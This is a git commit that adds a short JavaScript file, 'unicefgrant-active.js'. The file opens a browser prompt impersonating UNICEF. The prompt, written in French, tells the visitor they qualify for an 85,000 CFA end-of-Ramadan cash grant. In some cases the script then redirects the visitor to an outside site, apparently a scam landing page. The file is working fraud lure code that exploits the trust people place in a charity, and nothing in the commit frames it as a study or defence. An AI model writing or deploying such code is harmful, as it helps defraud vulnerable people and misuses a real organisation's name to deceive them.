a5b17dca9643004f8bad904ce40c72978bda0ed0
ekpeowo <ukpehansi@gmail.com>
2025-03-28 21:01:47 +0100

    Create unicefgrant-active.js

---
+++ unicefgrant-active.js
@@ -0,0 +1,5 @@
+var password = 'RETRAIT DE 85 000 CFA'
+password=prompt('UNICEF: Félicitations, vous êtes admissible à une subvention en espèces de fin de Ramadan de 85 000 CFA, appuyez sur OK pour retirer maintenant ','RETRAIT DE 85 000 CFA');
+if (password != 'RETRAIT DE 85 000 CFA') {
+location.href='https://news-active.org/unicef-grant';
+}
